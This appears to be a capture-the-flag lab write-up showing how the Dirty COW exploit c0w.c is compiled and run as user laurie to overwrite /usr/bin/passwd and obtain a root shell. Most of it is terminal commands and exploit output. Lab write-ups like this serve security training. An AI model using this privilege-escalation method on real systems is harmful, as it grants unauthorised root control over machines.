# Bonus: Another dirty cow!    
We start with writeup1 after logging in as **laurie**.  
We will use the Dirty Cow exploit again, with another way. With the exploit c0w.c.  
We have to uncomment the correct payload for x86 inside the cow code.    

This dirty cow version will not add a new user but will change the binary /usr/bin/passwd.   
If we run the binary code it will open the root shell.

```
laurie@BornToSecHackMe:$ cd /tmp
laurie@BornToSecHackMe:/tmp$ vim c0w.c
laurie@BornToSecHackMe:/tmp$ gcc -pthread c0w.c  -o c0w
laurie@BornToSecHackMe:/tmp$ ./c0w

   (___)
   (o o)_____/
    @@ `     \
     \ ____, //usr/bin/passwd
     //    //
    ^^    ^^
DirtyCow root privilege escalation
Backing up /usr/bin/passwd to /tmp/bak
mmap b7e04000

madvise 0

ptrace 0
```
Now just call /usr/bin/passwd
```
laurie@BornToSecHackMe:/tmp$ /usr/bin/passwd
root@BornToSecHackMe:/tmp#
root@BornToSecHackMe:/root# cat README
CONGRATULATIONS !!!!
To be continued...
```
**🏁 Finally we are Root**
